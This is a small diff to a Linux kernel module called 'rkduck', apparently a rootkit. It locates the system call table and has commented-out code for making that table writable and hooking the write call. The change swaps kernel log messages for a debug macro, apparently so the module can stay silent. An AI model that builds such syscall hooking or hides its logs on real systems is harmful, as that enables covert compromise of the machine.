@@ -3,12 +3,12 @@
 ptr_t* sys_call_table = NULL;
 
 int duck_init(void) {
-    printk("rkduck: loaded\n");
+    dbg("rkduck: loaded\n");
 
     if ((sys_call_table = (ptr_t *) find_syscall_table())) {
-        printk("rkduck: sys_call_table found at %p\n", sys_call_table);
+        dbg("rkduck: sys_call_table found at %p\n", sys_call_table);
     } else {
-        printk("rkduck: sys_call_table not found, aborting\n");
+        dbg("rkduck: sys_call_table not found, aborting\n");
     }
 
     // set_page_rw((ptr_t) sys_call_table);
@@ -37,5 +37,5 @@ void duck_exit(void) {
     // xchg(&sys_call_table[__NR_write], original_write);
     // set_page_ro((ptr_t) sys_call_table);
 
-    printk("rkduck: unloaded\n");
+    dbg("rkduck: unloaded\n");
 }
